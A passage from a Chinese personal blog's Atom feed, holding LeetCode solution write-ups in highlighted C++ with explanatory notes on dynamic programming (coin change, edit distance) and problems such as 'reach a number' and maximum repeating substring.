class="built_in">dp1</span>(coinTypes+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(amount+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= coinTypes; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = amount;</span><br><span class="line">            <span class="type">int</span> w = coins[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= amount; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(j &gt;= w) &#123;</span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i<span class="number">-1</span>][j], dp[i][j-w]<span class="number">-1</span>);</span><br><span class="line">                    dp1[i][j] = <span class="built_in">max</span>(dp1[i<span class="number">-1</span>][j], dp1[i][j-w]+w);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    dp[i][j] = dp[i<span class="number">-1</span>][j];</span><br><span class="line">                    dp1[i][j] = dp1[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (dp1[coinTypes][amount] == amount) ? amount - dp[coinTypes][amount] : <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>太慢了，非常简单的想法，一个记录用了多少硬币，一个记录当前背包内总价值</p></blockquote><h4 id="空间压缩"><a href="#空间压缩" class="headerlink" title="空间压缩"></a>空间压缩</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> coinTypes = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>, <span class="number">0</span>)</span>, <span class="title">dp1</span><span class="params">(amount+<span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = amount;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= coinTypes; i++) &#123;</span><br><span class="line">            <span class="type">int</span> w = coins[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = w; j &lt;= amount; j++) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j], dp[j-w]<span class="number">-1</span>);</span><br><span class="line">                dp1[j] = <span class="built_in">max</span>(dp1[j], dp1[j-w]+w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (dp1[amount] == amount) ? amount - dp[amount] : <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="101-3"><a href="#101-3" class="headerlink" title="101"></a>101</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> coinTypes = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>, amount+<span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= amount; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= coinTypes; j++) &#123;</span><br><span class="line">                <span class="type">int</span> w = coins[j<span class="number">-1</span>];</span><br><span class="line">                <span class="keyword">if</span>(i &gt;= w) dp[i] = <span class="built_in">min</span>(dp[i], dp[i-w]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (dp[amount] == amount+<span class="number">1</span>) ? <span class="number">-1</span> : dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>硬币的价值不用-1而用1，dp表示硬币数，找min，那么dp初值就不能是0<br>无限背包，外层容量，内层物品, 这里没有理解<br>如果<code>dp[amount]</code>是<code>amount+1</code>，说明没有填满，如果填满了，硬币数量一定小于<code>amount+1</code></p></blockquote><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> coinTypes = coins.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(amount+<span class="number">1</span>, amount+<span class="number">1</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= coinTypes; i++) &#123;</span><br><span class="line">            <span class="type">int</span> w = coins[i<span class="number">-1</span>];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = w; j &lt;= amount; j++) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">min</span>(dp[j], dp[j-w]+<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (dp[amount] == amount+<span class="number">1</span>) ? <span class="number">-1</span> : dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>内层容量，外层物品也能过，还可以快一点</p></blockquote><h2 id="编辑距离"><a href="#编辑距离" class="headerlink" title="编辑距离"></a>编辑距离</h2><h3 id="72-编辑距离"><a href="#72-编辑距离" class="headerlink" title="72. 编辑距离"></a><a href="https://leetcode.cn/problems/edit-distance/">72. 编辑距离</a></h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minDistance</span><span class="params">(string word1, string word2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len1 = word1.<span class="built_in">size</span>(), len2 = word2.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(len1+<span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len2+<span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len1; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt;= len2; i++) &#123;</span><br><span class="line">            dp[<span class="number">0</span>][i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len1; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">1</span>; j &lt;= len2; j++) &#123;</span><br><span class="line">                <span class="type">int</span> x = <span class="built_in">int</span>(word1[i<span class="number">-1</span>] != word2[j<span class="number">-1</span>]);</span><br><span class="line">                dp[i][j] = <span class="built_in">min</span>(x + dp[i<span class="number">-1</span>][j<span class="number">-1</span>], <span class="built_in">min</span>(dp[i<span class="number">-1</span>][j]+<span class="number">1</span>, dp[i][j<span class="number">-1</span>]+<span class="number">1</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len1][len2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;leetcode 101的动态规划专题&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;基本动态规划：一维&quot;&gt;&lt;a href=&quot;#基本动态规划：一维&quot; class=&quot;headerlink&quot; title=&quot;基本动态规划：一维&quot;&gt;&lt;/a&gt;基本动态规划：一维&lt;/h2&gt;&lt;h3 id=&quot;70-爬楼梯&quot;&gt;&lt;a href=&quot;#70-爬楼梯&quot; class=&quot;headerlink&quot; title=&quot;70. 爬楼梯&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/climbing-stairs/&quot;&gt;70. 爬楼梯&lt;/a&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;climbStairs&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; a=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;,b=&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(n&amp;lt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; i &amp;lt;n ; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; c = a+b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            a=b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            b=c;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; b;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;dp数组表示上n层楼有几种可能&lt;br&gt;转移方程是 $ dp[i] &amp;#x3D; dp[i-1] + dp[i-2] $&lt;br&gt;上到第i层有可能从第i-1层或i-2层上来，则上到i层的可能数目就是 $ dp[i-1] + dp[i-2] $&lt;br&gt;由于dp[i]只需要前两个数的数据，所以可以优化掉dp数组，用两个变量代替，节省数组空间&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&quot;198-打家劫舍&quot;&gt;&lt;a href=&quot;#198-打家劫舍&quot; class=&quot;headerlink&quot; title=&quot;198. 打家劫舍&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/house-robber/&quot;&gt;198. 打家劫舍&lt;/a&gt;&lt;/h3&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
    <category term="动态规划" scheme="https://jingtianer.github.io/home/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
    <category term="LeetCode 101" scheme="https://jingtianer.github.io/home/tags/LeetCode-101/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-18</title>
    <link href="https://jingtianer.github.io/home/2022/11/07/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9318/"/>
    <id>https://jingtianer.github.io/home/2022/11/07/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9318/</id>
    <published>2022-11-07T03:14:34.000Z</published>
    <updated>2022-11-14T13:52:45.683Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1668-最大重复子字符串"><a href="#1668-最大重复子字符串" class="headerlink" title="1668. 最大重复子字符串"></a><a href="https://leetcode.cn/problems/maximum-repeating-substring/">1668. 最大重复子字符串</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxRepeating</span><span class="params">(string sequence, string word)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len1 = sequence.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> len2 = word.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> maxk = <span class="number">0</span>, k = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len1;) &#123;</span><br><span class="line">            <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">            <span class="type">int</span> next = i+<span class="number">1</span>;</span><br><span class="line">            <span class="type">bool</span> flag1 = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; len2; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(sequence[i+j] != word[j]) &#123;</span><br><span class="line">                    flag = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(!flag1 &amp;&amp; j != <span class="number">0</span> &amp;&amp; sequence[i+j] == word[<span class="number">0</span>]) &#123;</span><br><span class="line">                    next = i+j;</span><br><span class="line">                    flag1=<span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; i &lt;&lt; &quot; &quot; &lt;&lt; k &lt;&lt; &quot; &quot; &lt;&lt; maxk &lt;&lt; endl;</span></span><br><span class="line">            <span class="keyword">if</span>(flag) &#123;</span><br><span class="line">                k++;</span><br><span class="line">                i += len2;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                maxk = <span class="built_in">max</span>(k, maxk);</span><br><span class="line">                <span class="keyword">if</span>(k == <span class="number">0</span>) &#123;</span><br><span class="line">                    i+=<span class="number">1</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    i = i-len2+<span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                k = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// cout &lt;&lt; i &lt;&lt; endl;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(maxk, k);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>笨方法，从右向左找，适当回溯</p></blockquote><h2 id="754-到达终点数字"><a href="#754-到达终点数字" class="headerlink" title="754. 到达终点数字"></a><a href="https://leetcode.cn/problems/reach-a-number/">754. 到达终点数字</a></h2><h3 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachNumber</span><span class="params">(<span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        target = <span class="built_in">abs</span>(target);</span><br><span class="line">        <span class="type">int</span> n = (<span class="built_in">sqrt</span>(<span class="number">8.0</span>*target+<span class="number">1</span>)<span class="number">-1</span>)/<span class="number">2</span>; <span class="comment">//8.0,防止int溢出</span></span><br><span class="line">        <span class="type">int</span> sum = (n+<span class="number">1</span>)*n/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(sum == target) &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> diff = target-sum;</span><br><span class="line">        <span class="keyword">if</span>((n % <span class="number">2</span> == <span class="number">1</span> &amp;&amp; diff % <span class="number">2</span> == <span class="number">0</span>) || (n % <span class="number">2</span> == <span class="number">0</span> &amp;&amp; diff % <span class="number">2</span> == <span class="number">1</span>)) &#123;</span><br><span class="line">            n += <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(diff %<span class="number">2</span> == <span class="number">1</span>) &#123;</span><br><span class="line">            n += <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            n += <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>这道题直接暴力搜索是不可行的，算法成为$ O( 2^{ target } ) $ 级别</p></blockquote><blockquote><p>考虑到只求步数，负数target可以转化成正数处理<br>首先计算 $ sum &#x3D; 1 + 2 + 3 + … + i + … + n &lt;&#x3D; target $, 如果  $  sum&#x3D;&#x3D;target $，则n就是步数<br>否则对sum进行调整，记 $ diff &#x3D; target-sum  &lt;&#x3D; n $ (一定小于n+1)，所以需要先减小sum，再加上几个数，使得新的sum等于target<br>情况一，第i步改为向左，再加上n+1, 也就是 $ sum - 2i + n+1 $，调整前后的差为 $ delta &#x3D; n + 1 -2i $, $ i &#x3D; 1,2,3,…,n; delta &#x3D; n-1, n-3, n-5 … $。这种情况对于<code>diff奇数n偶数</code>，或<code>diff偶数n奇数</code>的情况适用，总计步数<code>n+1</code><br>情况二，第i步改为向左，再加上n+1和n+2，也就是 $ sum - 2i + n+1 + n+2 $，调整前后的差为 $ delta &#x3D; 2(n-i) + 3 $, $ i &#x3D; 1,2,3,…,n; delta &#x3D; 3, 5, 7, 9, … $。这种情况对于<code>diff奇数且diff &gt;= 3</code>的情况适用，总计步数<code>n+2</code><br>情况三，减去<code>n+1</code>,加上<code>n+2</code>，显然使用于<code>diff=1</code>的情况，总计步数<code>n+2</code>，可以和情况二合并<br>情况四，以上没有覆盖到的情况，举个例子可知，总计步数<code>n+3</code></p></blockquote><h3 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachNumber</span><span class="params">(<span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        target = <span class="built_in">abs</span>(target);</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(sum &lt; target) &#123;</span><br><span class="line">            n++;</span><br><span class="line">            sum += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((sum-target) % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">while</span>((sum-target)%<span class="number">2</span>) &#123;</span><br><span class="line">            n++;</span><br><span class="line">            sum += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>计算 $ sum&#x3D;1+2+3+…+n &gt;&#x3D; target $<br>情况一：如果 $ diff &#x3D; sum-target &lt;&#x3D; n $ 是偶数，则步数就是n。 由于diff &lt;&#x3D; n,所以可以让第i步变成向左，即 $ sum - 2i, i&#x3D;0,1,2,3,…,n+1 $，则刚好可以变成target<br>其他情况：如果diff是奇数，则继续在sum的基础上加n,直到diff为偶数</p></blockquote><h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">reachNumber</span><span class="params">(<span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        target = <span class="built_in">abs</span>(target);</span><br><span class="line">        <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(sum &lt; target) &#123;</span><br><span class="line">            n++;</span><br><span class="line">            sum += n;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>((sum-target) % <span class="number">2</span> == <span class="number">0</span>) <span class="keyword">return</span> n;</span><br><span class="line">        <span class="keyword">return</span> n + n%<span class="number">2</span> +<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>根据方法1，调整的步数最多3步，进一步分析，当diff为奇数时，sum加几个数可以变成偶数，根据公式 $$ sum &#x3D; n(n+1)&#x2F;2 $$<br>可知：<br>n偶数，sum偶数，n+1奇数，<code>sum=sum+n+1</code>后sum变奇数<br>$$ n &#x3D; 4i, sum&#x3D;2i(2i+1) $$<br> n奇数，sum奇数，n+1偶数，n+2奇数，<code>sum=sum+n+1+n+2</code>后sum变偶数<br>$$ n &#x3D; 4i+1, sum&#x3D;(4i+1)(2i+1) $$<br>n偶数，sum奇数，n+1奇数，<code>sum=sum+n+1</code>后sum变偶数<br>$$ n &#x3D; 4i+2, sum&#x3D;(2i+1)(4i+3) $$<br>n奇数，sum偶数，n+1偶数，n+2奇数<code>sum=sum+n+1+n+2</code>后sum变奇数<br>$$ n &#x3D; 4i+3, sum&#x3D;(4i+3)(2i+2) $$ </p><p>由于diff为奇数，则sum为奇数时要变成偶数，否则变成奇数<br>整理上面的讨论，可知调整的步数为<code>n%2+1</code>，总步数为<code>n+n%2+1</code></p></blockquote><h2 id="1106-解析布尔表达式"><a href="#1106-解析布尔表达式" class="headerlink" title="1106. 解析布尔表达式"></a><a href="https://leetcode.cn/problems/parsing-a-boolean-expression/">1106. 解析布尔表达式</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 